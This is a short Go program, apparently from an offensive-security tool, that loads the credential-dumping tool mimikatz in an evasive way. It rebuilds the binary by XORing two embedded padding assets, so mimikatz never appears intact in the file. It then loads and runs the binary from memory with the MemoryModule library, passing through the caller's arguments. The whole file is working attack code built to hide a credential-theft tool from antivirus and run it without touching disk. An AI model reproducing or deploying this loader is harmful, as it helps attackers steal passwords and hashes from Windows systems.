package main

/*
#cgo CFLAGS: -IMemoryModule
#cgo LDFLAGS: MemoryModule/build/MemoryModule.a
#include "MemoryModule/MemoryModule.h"
*/
import "C"

import (
	"os"
	"unsafe"
)

func main() {
	// load mimikatz pads
	mimikatzPad0, err := Asset("mimikatz.exe.0.pad")
	if err != nil {
		panic(err)
	}
	mimikatzPad1, err := Asset("mimikatz.exe.1.pad")
	if err != nil {
		panic(err)
	}

	// XOR the pads togeather
	var mimikatzEXE []byte
	for index, bite := range mimikatzPad0 {
		mimikatzEXE = append(mimikatzEXE, []byte{bite ^ mimikatzPad1[index]}...)
	}

	// convert the args passed to this program into a C array of C strings
	var cArgs []*C.char
	for _, goString := range os.Args {
		cArgs = append(cArgs, C.CString(goString))
	}

	// load the mimikatz reconstructed binary from memory
	handle := C.MemoryLoadLibraryEx(
		unsafe.Pointer(&mimikatzEXE[0]),           // void *data
		(C.size_t)(len(mimikatzEXE)),              // size_t
		(*[0]byte)(C.MemoryDefaultAlloc),          // Alloc func ptr
		(*[0]byte)(C.MemoryDefaultFree),           // Free func ptr
		(*[0]byte)(C.MemoryDefaultLoadLibrary),    // loadLibrary func ptr
		(*[0]byte)(C.MemoryDefaultGetProcAddress), // getProcAddress func ptr
		(*[0]byte)(C.MemoryDefaultFreeLibrary),    // freeLibrary func ptr
		unsafe.Pointer(&cArgs[0]),                 // void *userdata
	)

	// run mimikatz
	C.MemoryCallEntryPoint(handle)

	// cleanup
	C.MemoryFreeLibrary(handle)
}
